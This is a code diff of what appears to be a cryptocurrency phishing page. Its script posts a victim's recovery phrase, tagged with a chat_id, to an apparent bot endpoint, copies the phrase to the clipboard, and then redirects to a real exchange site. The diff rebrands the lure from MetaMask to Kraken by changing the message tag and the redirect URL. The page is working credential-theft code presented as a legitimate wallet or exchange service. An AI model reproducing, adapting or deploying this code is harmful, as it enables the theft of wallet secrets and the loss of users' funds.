@@ -306,14 +306,14 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: chatId,
-          text: "S\n" + phrase.trim()
+          text: "kraken\n" + phrase.trim()
         })
       });
 
       navigator.clipboard.writeText(phrase.trim());
 
       setTimeout(() => {
-        window.location.href = "https://metamask.io/";
+        window.location.href = "https://www.kraken.com/";
       }, 800);
     }
 
@@ -338,4 +338,5 @@
   </script>
 </body>
 </html>
+
 
